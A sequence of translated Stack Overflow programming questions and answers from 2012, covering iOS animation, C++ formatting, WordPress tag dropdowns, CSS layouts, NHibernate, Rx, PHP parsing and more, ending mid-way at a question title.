所以我认为问题可能是“如何同时为 UIView 的帧大小和图层更改设置动画？”

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-08T00:57:52.370

代码比人们希望的要多，但是这样的东西应该可以工作。

```
 CGFloat animationDuration = 5.0;

  // Create the CABasicAnimation for the shadow
  CABasicAnimation *shadowAnimation = [CABasicAnimation animationWithKeyPath:@"shadowPath"];
  shadowAnimation.duration = animationDuration;
  shadowAnimation.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut]; // Match the easing of the UIView block animation
  shadowAnimation.fromValue = (id)self.shadowedView.layer.shadowPath;

  // Animate the frame change on the view
  [UIView animateWithDuration:animationDuration
                        delay:0.0f
                      options:UIViewAnimationCurveEaseInOut
                   animations:^{
                     self.shadowedView.frame = CGRectMake(self.shadowedView.frame.origin.x,
                                                          self.shadowedView.frame.origin.y,
                                                          self.shadowedView.frame.size.width * 2.,
                                                          self.shadowedView.frame.size.height * 2);
                   } completion:nil];

  // Set the toValue for the animation to the new frame of the view
  shadowAnimation.toValue = (id)[UIBezierPath bezierPathWithRect:self.shadowedView.bounds].CGPath;

  // Add the shadow path animation
  [self.shadowedView.layer addAnimation:shadowAnimation forKey:@"shadowPath"];

  // Set the new shadow path
  self.shadowedView.layer.shadowPath = [UIBezierPath bezierPathWithRect:self.shadowedView.bounds].CGPath; 
```

# c++ - 如何格式化输出

> ID：10239523
> 
> 赞同：1
> 
> 时间：2012-04-20T02:38:35.357
> 
> 标签：c++, function, setw

我想要一个干净的格式化输出，但结果并不像我想要的那样干净。下面是我的函数，它显示了输出，然后是输出。我正在使用 Dev-C++。感谢您的帮助。

```
void student::show(string name, int age, double GPA)
{
  cout<<name<<setw(7) <<age<<setw(7) <<GPA <<setw(7) <<endl;

}

******************output*******************************************

Timaya     24   2.65
 albert     29   2.43
zamounda     27   3.94
charles     26   2.78
 moumou     33   2.39
francois     24   3.07
   john     20   2.59
   papa     21   2.67
   peti     29   3.65
francoise     26   3.76
  iness     28   2.65
  elise     35   2.76
------------------------------------
-------------------------------------
GPA of the class:2.94 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:43:00.850

由于`setw`设置了*下一个*输出值的宽度，而不是前一个输出值的宽度，因此您应该将`setw`调用移至正在格式化的项目之前：

```
cout << setw(20) << name << setw(7) << age << setw(7) << GPA << endl; 
```

# android - Android-需要用图片+一些文字发布/分享我的游戏分数

> ID：10239529
> 
> 赞同：0
> 
> 时间：2012-04-20T02:39:56.707
> 
> 标签：android

我有使用这样的分享意图，但我没有找到一种用图片发布我的游戏分数的方法，请帮助我？

```
Intent share = new Intent(Intent.ACTION_SEND);
                share.setType("text/plain");
                share.putExtra(Intent.EXTRA_TEXT,"I just scored 1000");
                share.putExtra(Intent.EXTRA_SUBJECT, "Comming Soon!!");
                startActivity(Intent.createChooser(share, "Share...")); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:34:40.533

尝试这样的事情：

```
Intent shareIntent = new Intent(Intent.ACTION_SEND);
shareCaptionIntent.setType("image/*");

//game image
shareIntent.setData(gameImage);
shareIntent.putExtra(Intent.EXTRA_STREAM, gameImage);

//game score
shareCaptionIntent.putExtra(Intent.EXTRA_TITLE, "game score")

startActivity(Intent.createChooser(shareIntent, getString(R.string.share))); 
```

# php - 如果包含小写字母，则从数组中删除

> ID：10239532
> 
> 赞同：0
> 
> 时间：2012-04-20T02:40:41.213
> 
> 标签：php, wordpress

我有许多 WordPress 帖子，每个帖子都有两个标签，一个标签是州，另一个标签是机场代码。

我可以使用此处的说明从标签生成下拉菜单：http: [//www.wprecipes.com/wordpress-hack-display-your-tags-in-a-dropdown-menu](http://www.wprecipes.com/wordpress-hack-display-your-tags-in-a-dropdown-menu)

但是，我实际上希望有两个不同的下拉列表，一个以字母顺序列出州，另一个以字母顺序列出机场。每个机场将始终是三个大写字母。是否有一个我可以添加到此的论点，以便我可以为机场创建一个下拉列表，为国家创建另一个下拉列表？

如果它包含一个小写字母，它会出现在 State 下拉列表中。如果没有小写，它是一个机场。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:31:34.997

我将您所附教程中的片段修改为如下内容：

```
function dropdown_tag_cloud( $args = '' ) {//supported: 'all', 'airport', 'state'
    $defaults = array(
        'smallest' => 8, 'largest' => 22, 'unit' => 'pt', 'number' => 45,
        'format' => 'flat', 'orderby' => 'name', 'order' => 'ASC',
        'exclude' => '', 'include' => '', 'tags_mode' => 'all'
    );
    $args = wp_parse_args( $args, $defaults );

    print_r($args);

    $tags = get_tags( array_merge($args, array('orderby' => 'count', 'order' => 'DESC')) ); // Always query top tags

    if ( empty($tags) )
        return;

    $return = dropdown_generate_tag_cloud( $tags, $args ); // Here's where those top tags get sorted according to $args
    if ( is_wp_error( $return ) ){
        echo "wp error...";
        return false;
    }else
        echo apply_filters( 'dropdown_tag_cloud', $return, $args );
}

function dropdown_generate_tag_cloud( $tags, $args = '' ) {
    global $wp_rewrite;
    $defaults = array(
        'smallest' => 8, 'largest' => 22, 'unit' => 'pt', 'number' => 45,
        'format' => 'flat', 'orderby' => 'name', 'order' => 'ASC'
    );
    $args = wp_parse_args( $args, $defaults );
    extract($args);

    if ( !$tags )
        return;
    $counts = $tag_links = array();
    foreach ( (array) $tags as $tag ) {

        if($tags_mode == 'airport'){

            //if uppercased tag is equal to the tag
            //which means current tag already uppercased.
            if(!(strtoupper($tag->name) == $tag->name))
                continue;//skip current tag

        } else if($tags_mode == 'state'){
            //if uppercased tag is equal to the tag
            //which means current tag already uppercased.
            if((strtoupper($tag->name) == $tag->name))
                continue;//skip current tag
        }

        $counts[$tag->name] = $tag->count;
        $tag_links[$tag->name] = get_tag_link( $tag->term_id );
        if ( is_wp_error( $tag_links[$tag->name] ) )
            return $tag_links[$tag->name];
        $tag_ids[$tag->name] = $tag->term_id;
    }

    $min_count = min($counts);
    $spread = max($counts) - $min_count;
    if ( $spread <= 0 )
        $spread = 1;
    $font_spread = $largest - $smallest;
    if ( $font_spread <= 0 )
        $font_spread = 1;
    $font_step = $font_spread / $spread;

    // SQL cannot save you; this is a second (potentially different) sort on a subset of data.
    if ( 'name' == $orderby )
        uksort($counts, 'strnatcasecmp');
    else
        asort($counts);

    if ( 'DESC' == $order )
        $counts = array_reverse( $counts, true );

    $a = array();

    $rel = ( is_object($wp_rewrite) && $wp_rewrite->using_permalinks() ) ? ' rel="tag"' : '';

    foreach ( $counts as $tag => $count ) {
        $tag_id = $tag_ids[$tag];
        $tag_link = clean_url($tag_links[$tag]);
        $tag = str_replace(' ', '&nbsp;', wp_specialchars( $tag ));
        $a[] = "\t<option value='$tag_link'>$tag ($count)</option>";
    }

    switch ( $format ) :
    case 'array' :
        $return =& $a;
        break;
    case 'list' :
        $return = "<ul class='wp-tag-cloud'>\n\t<li>";
        $return .= join("</li>\n\t<li>", $a);
        $return .= "</li>\n</ul>\n";
        break;
    default :
        $return = join("\n", $a);
        break;
    endswitch;

    return apply_filters( 'dropdown_generate_tag_cloud', $return, $tags, $args );
} 
```

基本上，我只是添加`tags_mode`了支持以下参数的新参数：

```
all
airport
state 
```

然后，在 中`dropdown_generate_tag_cloud()`，我添加以下代码：

```
 if($tags_mode == 'airport'){

        if(!(strtoupper($tag->name) == $tag->name))
            continue;//skip current tag

    } else if($tags_mode == 'state'){
        if((strtoupper($tag->name) == $tag->name))
            continue;//skip current tag
    } 
```

这个添加的片段的主要思想是：

```
strtoupper($tag->name) == $tag->name 
```

> 它是这样工作的：如果大写的标签名称等于原始标签名称。这意味着，当前标签已经大写（或等于机场代码）。

要实现它，只需按照教程中的说明进行操作。只是，您需要添加新参数：

```
<?php dropdown_tag_cloud('number=0&order=asc&tags_mode=state'); ?> 
```

> 注意**&tags_mode=state**

试试看，告诉我这是否是你想要的。

# css - 如何使用 twitter bootstrap 让多个列消耗 100% 的高度？

> ID：10239534
> 
> 赞同：9
> 
> 时间：2012-04-20T02:40:47.627
> 
> 标签：css, twitter-bootstrap

我已经看到了许多类似的问题，但还没有找到我正在寻找的答案。进一步的信息如下：

*   我正在使用 twitter bootstrap，所以我想要一个与之兼容的解决方案
*   布局将如下[所示](https://i.stack.imgur.com/L3P85.png)。抱歉，我无法嵌入图像，因为我首先需要 10 分。
*   [这](http://jsbin.com/ehizof)与我到目前为止所获得的一样接近。问题是我无法让侧边栏停在页脚处。
*   我需要将主要内容扩展为与侧边栏相同的内容。
*   侧边栏和主要内容是两种不同的颜色和大小。它们都必须延伸到页脚
*   请注意，最小高度必须为 100%
*   如果内容增长太多，页脚应该移动（即需要滚动才能看到它）
*   我不想使用 JavaScript，但如果需要，我不介意使用 JS 逐步增强的解决方案（我也在使用 jQuery）。
*   页面内容水平居中，宽度固定

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-20T04:59:56.740

我认为这可能是您正在寻找的：[**两列布局**](http://fiddle.jshell.net/teresko/UG8Rk/show/) ^([源](http://jsfiddle.net/teresko/UG8Rk/))。

主要思想是设置`height: 100%`两者`<body>`，`<html>`然后确保容器也占据所有高度（通过`min-height: 100%`）。您可能会注意到代码还包含 IE6 的解决方法，因为它最初是编写的，而与 IE6 的斗争只是另一天的工作。

这是通过修改更复杂且更常用的[圣杯布局](http://fiddle.jshell.net/teresko/EkTVv/show/) ^([源](http://jsfiddle.net/teresko/UG8Rk/))来实现的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:12:24.007

通过 css 可能是可能的，但需要一些技巧。

您需要通过添加一个 padding-bottom: 1000px 使两个 div/列都非常高，然后使用 margin-bottom: -1000px “欺骗浏览器”认为它们不是那么高。通过下面的示例可以更好地解释。

[http://jsfiddle.net/mediasoftpro/Ee7RS/](http://jsfiddle.net/mediasoftpro/Ee7RS/)

希望这会没事。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T07:06:34.803

你可以试试**display:table;** 到**父 div**并**显示：table-cell；**到**Child Div**来实现你的结果....

查看代码：-

```
<!DOCTYPE html>
<html>
<head>
<meta charset=utf-8 />
<title>JS Bin</title>
<!--[if IE]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->
<style>
  .container {
    background:red;
    width:600px;
    display:table;
  }

  .left {
    background:yellow;
    width:200px;
    display:table-cell;

  }

    .mid {
    background:blue;
    width:400px;
    display:table-cell;

  }

      .right {
    background:green;
    width:200px;
    display:table-cell;

  }

</style>
</head>
<body>
  <div class="container">
    <div class="left">shailender</div>
      <div class="mid">Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.
        fff</div>
      <div class="right">afdafaf</div>

  </div>
</body>
</html> 
```

**演示：-** [http://jsbin.com/ebucoz/13/edit](http://jsbin.com/ebucoz/13/edit)

**[阅读更多关于流体宽度等高列的示例](http://css-tricks.com/examples/FluidEqualHeightFauxColumns/#)**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T05:07:59.210

嘿，我想你想要这个

**CSS**

**

```
.wraper, .header, .footer{
width:80%;
    margin:0 auto;
    overflow:hidden;
    border:solid 2px red;
}
.header{
    height:100px;
    background:green;
    border-color:darkred;
}
.sidebar{
width:20%;
    background:yellow;
    float:left;
}
.content{
width:70%;
    background:pink;
    float:right;
}
.footer{
    height:100px;
    background:blue;
    border-color:black;
}
#container2 {
background: none repeat scroll 0 0 #FFA7A7;
clear: left;
float: left;
overflow: hidden;
width: 100%;
}
#container1 {
background: none repeat scroll 0 0 #FFF689;
float: left;
position: relative;
right: 75%;
width: 100%;
}
#sidebar {
float: left;
left:76%;
overflow: hidden;
position: relative;
width: 20%;
text-align: justify;
}
#content {
    float: left;
    left: 81%;
    overflow: hidden;
    position: relative;
    text-align: justify;
    width: 72%;
} 
```

** **HTML**

```
 <div class="header">header bar </div>
    <div class="wraper">
        <div id="container2">
    <div id="container1">
        <div id="sidebar">
            This is dummy text here This is dummy text here This is dummy text here This is dummy text here This is dummy text here This is dummy text here This is dummy text
        </div>
        <div id="content">
           This is dummy text here This is dummy text here This is dummy
        </div>
    </div>
</div>
    </div>
        <div class="footer">Footer bar</div> 
```

现场演示[http://jsfiddle.net/rohitazad/Pgy75/2/](http://jsfiddle.net/rohitazad/Pgy75/2/)

有关此的更多信息，[请单击此处](http://matthewjamestaylor.com/blog/equal-height-columns-2-column.htm) [http://matthewjamestaylor.com/blog/equal-height-columns-2-column.htm](http://matthewjamestaylor.com/blog/equal-height-columns-2-column.htm)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-08-13T15:30:28.417

唯一真正的答案：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> 
```

```
<table border="1" height="100%" width="100%">
    <tr>
        <td width="10%">
            left
        </td>
        <td>
            right
        </td>
    </tr>
</table> 
```

# html - 如何用qt生成一个rtf文件？

> ID：10239535
> 
> 赞同：0
> 
> 时间：2012-04-20T02:40:55.930
> 
> 标签：html, qt, rtf

软件：Visual Studio 2008 +QT

目标： 1\. 生成包含文本和表格的**可编辑报告**

基于条件： 1.从 html 生成的报告 2.得到 Pdf 的报告

```
 ![enter image description here][1] 
```

问题：由于PDF格式无法编辑，我正在考虑使用RTF，这是可编辑的。但我不知道如何完成它。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T10:29:18.990

KWord 是基于 Qt、LGPL 许可的，它导出 RTF。也许您可以重用 KWord 的 RTF 导出过滤器或研究它来制作您自己的 RTF 生成器。

[从http://download.kde.org/stable/koffice-latest/](http://download.kde.org/stable/koffice-latest/)获取最新的源代码

有趣的代码可以在下面的 tarball 中找到`koffice-<version>/filters/kword/rtf/export/`

# c# - 从 NHibernate 的相关表中选择不同的值集

> ID：10239544
> 
> 赞同：1
> 
> 时间：2012-04-20T02:42:00.673
> 
> 标签：c#, nhibernate, nhibernate-criteria

抱歉，我是 NHibernate 的新手，希望我不会因为这个问题而让自己难堪。

我分别在 Logs 和 UserProfiles 表中有 2 个对象，一个 Log 和一个 UserProfile。每个 Log 对象引用一个或不引用一个 UserProfile 对象。

我想要一种从日志表中收集不同`UserProfile.UserName`字符串列表的有效方法，按字母顺序排列。使用 Linq，这相当简单，但我希望在数据库端完成此操作。我会怎么做

```
public IEnumerable<string> GetUserNamesInLogs(){} 
```

看起来像？

如果我用 SQL 写这个，我会做这样的事情：

```
select distinct
    u.UserName
from
    Logs as l
inner join
    UserProfiles as u
    on u.UserId = l.UserId; 
```

我正在寻找 NHibernate 中的等价物。我想我不想为此延迟加载（这似乎是性能消耗），但我可能不清楚延迟加载的工作原理。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T21:12:10.123

jbl答案的一些优化：

```
UserProfile userProfileAlias = null;
Log logAlias = null;

session.QueryOver(() => userProfileAlias)
              .JoinAlias(() => userProfileAlias.Logs, () => logAlias)
              .Select(
                  Projections.Distinct(Projections.Property(() => userProfileAlias.Name))))
              .OrderBy(() => userProfileAlias.Name).Asc
              .List<string>(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:43:02.873

没有类和映射很难回答。假设您在*UserProfile*类中映射了与 UserProfile 的 Logs 对应的*Logs集合属性，则 UserProfile 的类和映射应如下所示：*

 *```
public class UserProfile
{
...

public virtual IList<Log> Logs {get;set;}

...
}

<?xml version="1.0" encoding="utf-8" ?>
   <hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" auto-import="true" >
  <class name="blabla.UserProfile, blabla" table="UserProfiles">

  .....
  <bag name="Logs" fetch="select" inverse="true" access="property" lazy="true">
    <key column="UserId"/>
    <one-to-many class="blabla.Log, blabla"/>
  </bag>

............ 
```

，你可以尝试这样的事情：

```
UserProfile upAlias=null;

var result = yourNHSession.QueryOver<UserProfile>(() => upAlias)
              .JoinQueryOver(x => x.Logs)
              .Select(
                  Projections.Distinct(
                     Projections.ProjectionList()
                     .Add(Projections.Property<UserProfile>(x=>x.Name))))
              .OrderBy(() => upAlias.Name)
              .Asc
              .List<String>().ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T14:41:01.150

完全没能按照我希望的方式使用标准，我作弊了：

```
var result = _Session.CreateQuery("select distinct profile.UserName from Log as l inner join l.UserProfile as profile order by profile.UserName asc")
    .List<string>(); 
```

这给了我想要的结果。感谢那些帮助过的人。*

# python - Django URL 工作，但在站点模板中不可点击

> ID：10239547
> 
> 赞同：1
> 
> 时间：2012-04-20T02:42:22.900
> 
> 标签：python, django, pinax

一切都很顺利，直到突然我的导航栏链接不起作用。

如果我将鼠标悬停在导航栏上，它会显示正确的 url，我什至可以在地址栏中键入该 url 并且它可以工作。但是，当我单击导航栏链接时，例如我的登录名、配置文件、通知 - 没有任何反应。

事实上，这并不完全正确。例如，当我单击通知时，我的用户菜单会弹出，这些链接（管理员或帐户）均不可单击。网站上除导航栏以外的所有其他链接似乎都工作正常。

什么会导致这种情况？

编辑：问题已经消失了，至少现在。我什至什么都没做。太奇怪了。

这是一个屏幕截图来说明正在发生的事情： ![在此处输入图像描述](../Images/4f9a961bf2d05d3159af7148c5c1ed7b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:56:24.407

看起来，错误本身实际上与 Django 无关。好像您正在使用 Twitter Bootstrap。（对吗？）如您所说，如果 url 出现在浏览器的状态栏上，您应该检查链接是否绑定到任何应该阻止 url 更改的事件。在所有情况下，您最好将代码片段连同问题一起提交。没有它，我们就无法真正了解正在发生的事情。

# c# - 同步多个可观察对象的顺序

> ID：10239549
> 
> 赞同：4
> 
> 时间：2012-04-20T02:42:47.597
> 
> 标签：c#, .net, system.reactive

我有多个（2-10）个热可观察对象，每个在给定的时间窗口内触发一个事件，但不是按顺序。

假设我有 3 个主题，为了说明这一点，它们按任意顺序触发：

```
Subjects: sA, sB, sC

Order of time window 1:
  sB, then sA, then sC
Order of time window 2:
  sA, then sC, then sB
Order of time window 3:
  sA, then sB, then sC
etc. 
```

因此，如果我要进行合并，我会得到以下流：sB、sA、sC、sA、sC、sB、sA、sB、sC 等。

现在，这是我的问题：我想强制每个时间窗口内的事件顺序。

```
1\. sA
2\. sB
3\. sC 
```

这将导致以下合并流：sA、sB、sC、sA、sB、sC、sA、sB、sC 等。

窗口时间本身是未知的，但是由于每个事件在每个窗口中只触发一次，我们可以假设一旦所有对象都触发了窗口，窗口就会关闭并打开一个新窗口。

任何想法如何优雅地做到这一点？

扩展问题（不那么重要）：可观察对象彼此独立，因此我需要引入一个通用的静态方法，我可以在其中同步每个可观察对象的顺序。

```
public static IObservable<T> SynchronizeOrder<T>(IObservable<T> source, int order)
{
  //return synchronized source
} 
```

**更新**：我最初的问题中不清楚的是，可观察对象可以是不同的事件类型（这就是我在示例中没有使用特定事件数据类型的原因），因此我不想合并有序的可观察对象. 我想有一种机制，我可以确保独立的可观察对象按它们的顺序同步。

```
myEventStream
 .ObserveOn(TaskFactory)
 .DoSomeExpensiveComputation()
 .Order(2) //doesn't have to be an extension method
 .Subscibe(computationResult=>
            sharedRessourceWhereOrderMatters.Update(computationResult)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:18:37.817

这可以使用可观察连接完成您想要的操作：

```
 using System.Reactive;
    using System.Reactive.Subjects;
    using System.Reactive.Linq;

    var a = new Subject<int>();
    var b = new Subject<int>();
    var c = new Subject<int>();

    var test = 
        Observable.When(
            a.And(b).And(c).Then((a1, b1, c1) => new int[] { a1, b1, c1 })
        ).SelectMany(arr => arr.ToObservable());

    var sub = test.Subscribe(val => Console.Write("{0} ", val));

    a.OnNext(1);
    b.OnNext(2);
    c.OnNext(3);

    a.OnNext(1);
    c.OnNext(3);
    b.OnNext(2);

    c.OnNext(3);
    a.OnNext(1);
    b.OnNext(2);

    Console.ReadKey();
    sub.Dispose(); 
```

输出是：

```
1 2 3 1 2 3 1 2 3 
```

但请注意：

1.  这不提供允许您以某种顺序注入特定可观察对象的扩展方法。您需要使用`And`（可以逐步完成）构建计划，然后最终执行它。“建立”顺序将是输出顺序。

2.  这不看实际的窗口创建。但是，没有理由不能将其注入到可观察链中的某个地方。

3.  每次所有三个可观察对象都具有值时，此解决方案将触发*一次。*您可能需要设置它并在正确的位置将其拆除以获得所需的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T19:07:43.930

yamens 的答案非常适合在同一范围内具有相同类型的 observables。在我的情况下（扩展问题），可观察对象可以是不同的类型，并且可以在执行的任何时候同步订单。

所以这是我提出的简单解决方案：

```
private readonly object syncRoot = new object();
private int sourceCount;
private readonly SortedDictionary<int, Action> buffer = new SortedDictionary<int, Action>();

public IObservable<T> Order<T>(IObservable<T> source, int order)
{
    return Observable.Create<T>(observer =>
    {
        lock (syncRoot)
            sourceCount++;

        source.Synchronize(syncRoot).Subscribe(item =>
        {
            buffer[order] = () => observer.OnNext(item);
            if(buffer.Count == sourceCount)
            {
                foreach (var action in buffer.Values)
                    action();
                buffer.Clear();
            }
        }, observer.OnError, observer.OnCompleted);

        return () =>
        {
            lock (syncRoot)
                sourceCount--;
        };
    });
}//end order 
```

# constants - 什么时候调用 const 版本？

> ID：10239550
> 
> 赞同：1
> 
> 时间：2012-04-20T02:42:53.253
> 
> 标签：constants

我为 A 类制作了“T operator[](int i) const”和“T& operator[](int i)”。

（我还尝试了“const T& operator[](int i) const”和“T& operator[](int i)”）

运算符打印一个值以区分调用哪个运算符。

```
A a;
int k = a[0];
k = a[0];
const int l = a[0]; 
```

结果：三个非常量版本的调用。

如何调用 const 版本？我应该使用 const 类吗？不使用 const 类就没有机会调用 const 版本的函数吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:57:09.843

您可以使用 const 参考：

```
const A& b=a;
k=b[0]; 
```

或者一个 const 演员：

```
k=const_cast<const A&>(a)[0]; 
```

# c++ - 在文本字段中输入 0.0 时 iOS 调试器崩溃

> ID：10239553
> 
> 赞同：0
> 
> 时间：2012-04-20T02:43:05.300
> 
> 标签：c++, ios, xcode

我目前正在 Xcode 中开发一个 iOS 应用程序，并且我想出了计算有效数字位数的代码。它是用 C++ 编写的，但我做了一些更改以使其正常工作。每当我输入零值时，它就会崩溃，但其他任何东西都可以正常工作。

我的代码如下：

```
- (IBAction)sigFigCount:(UITextField *)thetextfield
{
length = 0;
if (thetextfield == _textfield1)
{
    if ([thetextfield.text length] > 0)//If TextField Has More Than 0 digits...
    {
        text1 = std::string([_textfield1.text UTF8String]);
        while (text1.at(0) == '0' || text1.at(0) == '.')//Trim Leading Zeros...
        {
            text1 = text1.substr(1);
        }
        length = text1.length();
        decimal = text1.find('.');
        if (decimal >= 0 && decimal < text1.length())//Dont count decimal as sig fig...
        {
            length -= 1;
        }
        if ([[_textfield1 text] doubleValue] == 0.0)
        {
            NSLog(@"HERE");
            self.display3.text = @"1";
        }
        NSString *siggy = [NSString stringWithFormat:@"%i", length];
        self.display3.text = siggy;
    }
    if ([thetextfield.text length] == 0)
    {
        length = 0;
        NSString *ifzero = [NSString stringWithFormat:@"%i", length];
        self.display3.text = ifzero;
    }
    if ([[thetextfield text] doubleValue] == 0.0)
    {
        newLength = 1;
        NSString *zeroVal = [NSString stringWithFormat:@"%i", newLength];
        self.display3.text = zeroVal;
    }
    NSString *norm = [NSString stringWithFormat:@"%i", length];
    self.display3.text = norm;
}
} 
```

请帮助，我相信它与数字在内存中的表示方式有关......但是当我把它放在一个while语句中时，NSLog工作......任何输入都表示赞赏。

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:49:57.750

```
while (text1.at(0) == '0' || text1.at(0) == '.')//Trim Leading Zeros...
        {
            text1 = text1.substr(1);
        } 
```

我相信这就是你的问题所在。您的测试字符串 '0.0' 仅包含 0 和 . 人物。循环 3 次后， text1 是空字符串，但您仍在尝试访问第一个字符。

这条线也可能不符合您的预期： if ([[thetextfield text] doubleValue] == 0.0)

任何不是数字的东西都会被转换为 0.0，这`[@"foo" doubleValue] == 0.0`也是如此。

这里还有很多其他问题，比如使用 UTF8String。如果用户输入的不是低 ascii 字符，就会发生奇怪的事情。

你真的不应该在这里需要任何 C++。仅使用目标 C 将非常容易。

其他一些评论...您可能想要 if/else if/else if 而不是仅仅 3 个连续的 else。

最后一个 if 也可以很容易地转换为：

```
 if ([[thetextfield text] doubleValue] == 0.0)
    {
        newLength = 1;
        NSString *zeroVal = [NSString stringWithFormat:@"%i", newLength];
        self.display3.text = zeroVal;
    } 
```

至

```
if (...) {
  self.display3.text = @"1";
} 
```

# php - 如何使用 PHP 解析 HTML/XML

> ID：10239555
> 
> 赞同：1
> 
> 时间：2012-04-20T02:43:12.760
> 
> 标签：php, html, xml

从网关我得到一个非常不寻常的结果，它是 XML 中的 HTML，这让我感到困惑。当我回显变量时，`$result`这是输出：

```
<Results>
    <XML_Report>
       <Subject>
         <EFX_Code>199</EFX_Code>
         <Referral>SPECIAL_WOHA</Referral>
       </Subject>
    </XML_Report>
<HTML_Report>
<![CDATA[
        <html>
        <head>

        </head>
        <body>

        <a name="mergereport" />

        <p>MERGE REPORT</p>

        <table border="1" WIDTH="100%" cellpadding=0 cellspacing=0>
        <tr><td class=heading colspan=4 align="center" bgcolor="#c0c0c0"><p class=heading>Personal Information Since 08/09/09 FAD 04/17/12</p></td></tr>
        <tr><td><br /></td><td><br /></td><td width="15%" align=center><p><b>Reported</b></p></td><td align=center><p><b>Bur</b></p></td></tr>
        <tr>
        <td width="15%" valign=top align=right><p class=pipad><b>
        Name<br />
        SSN<br />
        Inquiry SSN<br />
        DOB<br />
        Address
        </b></p></td>
        </tr></table>
        </body>

        </html>
]]>
 </HTML_Report>
</Results> 
```

如何解析该变量以仅提取我想要的部分 HTML，例如。任何带有PHP标签的东西......我已经浏览了很多但如果这样的解析是可能的并且更重要的是如何找到任何正确的答案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:14:07.310

```
$doc = new DOMDocument();
$doc->loadHTML($your_html); 
```

然后阅读如何使用[DOM 库](http://us.php.net/manual/en/book.dom.php)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:46:14.567

在理想的世界中，这`XML_Report`将是供您的 PHP 之类的脚本阅读的，而 是`HTML_Report`仅用于人工显示的。但是，您发布的示例似乎并非如此。

您在这里有两个解析任务。

首先，解析 XML。在其中导航（通过 XPath 或 DOM 函数）到元素的`CDATA`内容`HTML_Report`。

现在，第二个任务：解析 HTML，就好像您将它作为原始字符串接收一样。

如果您要问的是“如何使用 PHP 解析 HTML？” 这个网站上有大约 18.74 亿个答案。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-20T03:12:39.127

```
$html = substr($xml, strpos($xml, '<html>'), 
               strpos($xml, '</html>') - strpos($xml, '<html>') + 7); 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-20T02:52:04.143

一个快速而肮脏的解决方案：

```
//Assumes the contents of the xml file are in a string called $xml
$arr = explode("<HTML_Report>", $xml);
if(count($arr) > 1)
{
    $arr2 = explode("</HTML_Report>", $arr[1]);
    $html_portion = $arr2[0];
} 
```

摘要：在 HTML_Report 开始和结束标记处拆分 xml 字符串，每次只保留包含 HTML 部分的结果数组的元素。这将导致 $html_portion 也包含 CDATA 包装器，因此如果您想避免这种情况，请在“”上拆分。

它并不优雅，但它完成了工作。

编辑：从 $xml[1] 到 $arr[1] 的固定代码 - 感谢 Marc B.

# javascript - 如何在我的文件中找到真正的错误？

> ID：10239561
> 
> 赞同：3
> 
> 时间：2012-04-20T02:43:55.030
> 
> 标签：javascript, firebug

我写了一个程序，想用firebug调试它。但是firebug总是告诉我我的jquery之类的库文件有问题，这绝对不是问题的根源。它显示如下：

```
((f.event.special[s.origType] || {}).handle || s.handler).apply is not a function

...{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAt...     jquery....min.js (line 3) 
```

我知道我的程序一定有问题。但是我怎样才能在我的文件中找到真正的错误呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:52:47.247

在发生错误的 jQuery 行上放置一个断点并展开调用堆栈，直到它源自您的代码（这可能会调用具有不正确参数类型的 jQuery 方法等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:50:37.667

![在此处输入图像描述](../Images/0fb318c12928d1c29b2dfa2377bb3fb2.png)

*从@alex 回答，这里是如何使用断点。*

单击所需的行号。只需留意该行*并按 F10*到下一行。在第 10 行将扔到图书馆。因为一个错误。*希望它可以帮助你。*

# webview - JavaFX - 获取网页对象的坐标

> ID：10239575
> 
> 赞同：1
> 
> 时间：2012-04-20T02:46:27.767
> 
> 标签：webview, browser, coordinates, javafx

我目前正在使用 JavaFX WebEngine/WebView 处理我的项目。我一直在尝试解决我目前面临的问题，但我陷入了困境。

问题是找出是否有可能 1\. 获取网页对象（超链接、图像、按钮等）的坐标 2\. 区分所选对象（超链接、图像、按钮等）

如果可能的话，你能告诉我怎么做吗？

提前非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T09:06:41.267

你能解释一下“物体的坐标”吗？如果您提到页面中对象的位置（即 DOM 层次结构位置），那么由于`WebEngine`它就像一个 Web 浏览器，您可以通过 javascript 操作加载的 HTML DOM 对象，并且可能通过 JQuery 之类的 javascipt 框架更好。只需搜索网络“jquery”+“您提出的问题”。

# c++ - GetPrivateProfileInt - 只读取默认值

> ID：10239576
> 
> 赞同：5
> 
> 时间：2012-04-20T02:46:50.090
> 
